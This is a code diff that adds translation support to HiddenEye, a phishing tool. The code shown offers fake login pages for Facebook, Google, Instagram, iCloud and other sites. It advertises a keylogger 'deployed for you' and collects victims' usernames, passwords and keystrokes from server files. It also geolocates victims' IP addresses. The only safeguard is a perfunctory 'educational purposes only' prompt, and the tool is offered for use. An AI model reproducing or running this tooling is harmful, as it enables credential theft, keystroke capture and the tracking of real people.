@@ -9,10 +9,15 @@ from urllib.request import urlopen
 from subprocess import check_output
 from sys import stdout, argv
 from Defs.Configurations import readConfig, ifSettingsNotExists
+from Defs.Languages import *
+
+checkAndSetLanguage() #WIP!!! MUST BE UPDATED
+
 RED, WHITE, CYAN, GREEN, DEFAULT = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'
 
 ifSettingsNotExists()
 config = readConfig()
+
 logFile = None
 didBackground = config.get("Settings","DidBackground")
 for arg in argv:
@@ -69,8 +74,8 @@ def runPhishing(page , customOption): #Phishing pages selection menu
         copy_tree("WebPages/VK_poll_method/", "Server/www/")
 
 def selectServer(): #Question where user must select server
-        print("\n {0}Please select any available server:{1}".format(RED, DEFAULT))
-        print("\n {0}[{1}1{0}]{1} Ngrok\n {0}[{1}2{0}]{1} Serveo".format(RED, DEFAULT))
+        print(_("\n {0}Please select any available server:{1}").format(RED, DEFAULT))
+        print(_("\n {0}[{1}1{0}]{1} Ngrok\n {0}[{1}2{0}]{1} Serveo").format(RED, DEFAULT))
 
         choice = input(" \n {0}HiddenEye >>> {1}".format(RED, DEFAULT))
 
@@ -121,7 +126,7 @@ def runServeo():
 
 def runMainMenu(): #menu where user select what they wanna use
     system('clear')
-    print ('''
+    print (_('''
 
 
 {1}<=============================================================================>
@@ -137,36 +142,37 @@ def runMainMenu(): #menu where user select what they wanna use
                  {0}[ NOW WITH LIVE VICTIM ATTACK INFORMATION ]
          {0}A KEYLOGGER WILL BE DEPLOYED FOR YOU, TO CAPTURE EVERY KEYSTROKE ]
 <=============================================================================>
-                                             '''.format(GREEN, DEFAULT, CYAN, RED))
+                                             ''').format(GREEN, DEFAULT, CYAN, RED))
 
 
 
 
     if 256 != system('which php'): #Checking if user have PHP
         print (" -----------------------".format(CYAN, DEFAULT))
-        print ("[PHP INSTALLATION FOUND]".format(CYAN, DEFAULT))
+        print (_("[PHP INSTALLATION FOUND]").format(CYAN, DEFAULT))
         print (" -----------------------".format(CYAN, DEFAULT))
     else:
-        print (" --{0}>{1} PHP NOT FOUND: \n {0}*{1} Please install PHP and run me again.http://www.php.net/".format(CYAN, DEFAULT))
+        print (_(" --{0}>{1} PHP NOT FOUND: \n {0}*{1} Please install PHP and run me again.http://www.php.net/").format(CYAN, DEFAULT))
         exit(0)
 
     for i in range(101):
         sleep(0.05)
-        stdout.write("\r{0}[{1}*{0}]{1} HiddenEye is Opening. Please Wait... %d%%".format(RED, DEFAULT) % i)
+        stdout.write(_("{0}[{1}*{0}]{1} HiddenEye is Opening. Please Wait...{2}%").format(RED, DEFAULT, i))
+        system("clear")
         stdout.flush()
 
-    if input("\n{2}[{1}!{2}]{1} Do you agree to use this tool for educational purposes only? ({2}y{1}/{0}n{1})\n{2}HiddenEye >>> {1}".format(CYAN, DEFAULT, RED)).upper() != 'Y': #Question where user must accept education purposes
+    if input(_("\n{2}[{1}!{2}]{1} Do you agree to use this tool for educational purposes only? ({2}y{1}/{0}n{1})\n{2}HiddenEye >>> {1}").format(CYAN, DEFAULT, RED)).upper() != 'Y': #Question where user must accept education purposes
         system('clear')
-        print ('\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE. GOOD BYE!{1} ]\n\n'.format(RED, DEFAULT))
+        print (_('\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE. GOOD BYE!{1} ]\n\n').format(RED, DEFAULT))
         exit(0)
-    option = input("\nSELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} GitHub\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Instagram\n\n {0}[{1}9{0}]{1} Snapchat\n\n {0}[{1}10{0}]{1} Yahoo\n\n {0}[{1}11{0}]{1} Twitch\n\n {0}[{1}12{0}]{1} Microsoft\n\n {0}[{1}13{0}]{1} Steam\n\n {0}[{1}14{0}]{1} VK\n\n {0}[{1}15{0}]{1} iCloud\n\n{0}HiddenEye >>>  {1}".format(RED, DEFAULT))
+    option = input(_("\nSELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} GitHub\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Instagram\n\n {0}[{1}9{0}]{1} Snapchat\n\n {0}[{1}10{0}]{1} Yahoo\n\n {0}[{1}11{0}]{1} Twitch\n\n {0}[{1}12{0}]{1} Microsoft\n\n {0}[{1}13{0}]{1} Steam\n\n {0}[{1}14{0}]{1} VK\n\n {0}[{1}15{0}]{1} iCloud\n\n{0}HiddenEye >>>  {1}").format(RED, DEFAULT))
     if option == '1':
         loadModule('Facebook')
-        customOption = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n{0}HiddenEye >>> {1}".format(RED, DEFAULT))
+        customOption = input(_("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n{0}HiddenEye >>> {1}").format(RED, DEFAULT))
         runPhishing('Facebook', customOption)
     elif option == '2':
         loadModule('Google')
-        customOption = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}3{0}]{1} New Google Web\n\n{0}HiddenEye >>> {1}".format(RED, DEFAULT))
+        customOption = input(_("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}3{0}]{1} New Google Web\n\n{0}HiddenEye >>> {1}").format(RED, DEFAULT))
         runPhishing('Google', customOption)
     elif option == '3':
         loadModule('LinkedIn')
@@ -190,7 +196,7 @@ def runMainMenu(): #menu where user select what they wanna use
         runPhishing('Twitter', customOption)
     elif option == '8':
         loadModule('Instagram')
-        customOption = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n{0}HiddenEye >>> {1}".format(RED, DEFAULT))
+        customOption = input(_("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n{0}HiddenEye >>> {1}").format(RED, DEFAULT))
         runPhishing('Instagram', customOption)
     elif option == '9':
         loadModule('Snapchat')
@@ -214,7 +220,7 @@ def runMainMenu(): #menu where user select what they wanna use
         runPhishing('Steam', customOption)
     elif option == '14':
         loadModule('VK')
-        customOption = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n{0}HiddenEye >>> {1}".format(RED, DEFAULT))
+        customOption = input(_("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n{0}HiddenEye >>> {1}").format(RED, DEFAULT))
         runPhishing('VK', customOption)
     elif option == '15':
         loadModule('iCloud')
@@ -224,14 +230,14 @@ def runMainMenu(): #menu where user select what they wanna use
         exit(0)
 
 def loadModule(module): #This one just show text..
-       print (''' {0}
- [{1}*{0}] module loaded. Building site...{0}'''.format(RED, DEFAULT))
+       print (_(''' {0}
+ [{1}*{0}] module loaded. Building site...{0}''').format(RED, DEFAULT))
 
 def inputCustom(): #Question where user can input custom web-link
-     print("\n (Choose Wisely As Your Victim Will Redirect to This Link)".format(RED, DEFAULT))
-     print("\n (Leave Blank To Loop The Phishing Page)".format(RED, DEFAULT))
-     print("\n {0}Insert a custom redirect url:".format(RED, DEFAULT))
-     custom = input("\n {0}CUSTOM URL>>> {1}".format(RED, DEFAULT))
+     print(_("\n (Choose Wisely As Your Victim Will Redirect to This Link)").format(RED, DEFAULT))
+     print(_("\n (Leave Blank To Loop The Phishing Page)").format(RED, DEFAULT))
+     print(_("\n {0}Insert a custom redirect url:").format(RED, DEFAULT))
+     custom = input(_("\n {0}CUSTOM URL>>> {1}").format(RED, DEFAULT))
      if 'http://' in custom or 'https://' in custom:
          pass
      else:
@@ -262,7 +268,7 @@ def runServer():
 
 def endMessage(): #Message when HiddenEye exit
     system('clear')
-    print ('''
+    print (_('''
                      {1}_....~~~~=====~~~~...._
                   .'========={3}/----=\{1}=========>
                 /:========={3}/-----====\{1}
@@ -273,19 +279,19 @@ def endMessage(): #Message when HiddenEye exit
 
                   {3}HIDDEN EYE {3}BY: DARKSEC TEAM
          {0}THANKS FOR USING IT. HELP US TO MAKE IT MORE USEFUL
-              {3}https://github.com/DarkSecDevelopers/HiddenEye     '''.format(GREEN, DEFAULT, CYAN, RED))
+              {3}https://github.com/DarkSecDevelopers/HiddenEye     ''').format(GREEN, DEFAULT, CYAN, RED))
 
 def getCredentials():
 
 
 
-    print("{0}[{1}*{0}]{1} Waiting for credentials//Keystrokes//Victim's device info. \n".format(CYAN, DEFAULT))
+    print(_("{0}[{1}*{0}]{1} Waiting for credentials//Keystrokes//Victim's device info. \n").format(CYAN, DEFAULT))
     while True:
         with open('Server/www/usernames.txt') as creds:
             lines = creds.read().rstrip()
             if len(lines) != 0:
                 writeLog('======================================================================'.format(RED, DEFAULT))
-                writeLog(' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, DEFAULT) % lines)
+                writeLog(_(' {0}[ CREDENTIALS FOUND ]{1}:\n {0}{2}{1}').format(GREEN, DEFAULT, lines))
                 system('rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
                 writeLog('======================================================================'.format(RED, DEFAULT))
 
@@ -295,21 +301,21 @@ def getCredentials():
         with open('Server/www/ip.txt') as creds:
             lines = creds.read().rstrip()
             if len(lines) != 0:
-                ip = re.match('Victim Public IP: (.*?)\n', lines).group(1)
-                resp = urlopen('https://ipinfo.io/%s/json' % ip)
+                ip = re.match('User Public IP: (.*?)\n', lines).group(1)
+                resp = urlopen('https://ipinfo.io/{0}/json'.format(ip))
                 ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
                 if 'bogon' in ipinfo:
                     log('======================================================================'.format(RED, DEFAULT))
-                    log(' \n{0}[ VICTIM IP BONUS ]{1}:\n {0}%s{1}'.format(GREEN, DEFAULT) % lines)
+                    log(_(' \n{0}[ VICTIM IP BONUS ]{1}:\n {0}{2}{1}').format(GREEN, DEFAULT, lines))
                 else:
                     matchObj = re.match('^(.*?),(.*)$', ipinfo['loc'])
                     latitude = matchObj.group(1)
                     longitude = matchObj.group(2)
                     writeLog('======================================================================'.format(RED, DEFAULT))
-                    writeLog(' \n{0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}'.format(GREEN, DEFAULT) % lines)
-                    writeLog(' \n{0}Longitude: %s \nLatitude: %s{1}'.format(GREEN, DEFAULT) % (longitude, latitude))
-                    writeLog(' \n{0}ISP: %s \nCountry: %s{1}'.format(GREEN, DEFAULT) % (ipinfo['org'], ipinfo['country']))
-                    writeLog(' \n{0}Region: %s \nCity: %s{1}'.format(GREEN, DEFAULT) % (ipinfo['region'], ipinfo['city']))
+                    writeLog(_(' \n{0}[ VICTIM INFO FOUND ]{1}:\n {0}{2}{1}').format(GREEN, DEFAULT, lines))
+                    writeLog(_(' \n{0}Longitude: {2} \nLatitude: {3}{1}').format(GREEN, DEFAULT, longitude, latitude))
+                    writeLog(_(' \n{0}ISP: {2} \nCountry: {3}{1}').format(GREEN, DEFAULT, ipinfo['org'], ipinfo['country']))
+                    writeLog(_(' \n{0}Region: {2} \nCity: {3}{1}').format(GREEN, DEFAULT, ipinfo['region'], ipinfo['city']))
                 system('rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
                 writeLog('======================================================================'.format(RED, DEFAULT))
 
@@ -319,7 +325,7 @@ def getCredentials():
             lines = creds.read().rstrip()
             if len(lines) != 0:
                 writeLog('______________________________________________________________________'.format(RED, DEFAULT))
-                writeLog(' {0}[ GETTING PRESSED KEYS ]{1}:\n {0}%s{1}'.format(GREEN, DEFAULT) % lines)
+                writeLog(_(' {0}[ GETTING PRESSED KEYS ]{1}:\n {0}%s{1}').format(GREEN, DEFAULT) % lines)
                 system('rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt')
                 writeLog('______________________________________________________________________'.format(RED, DEFAULT))
 
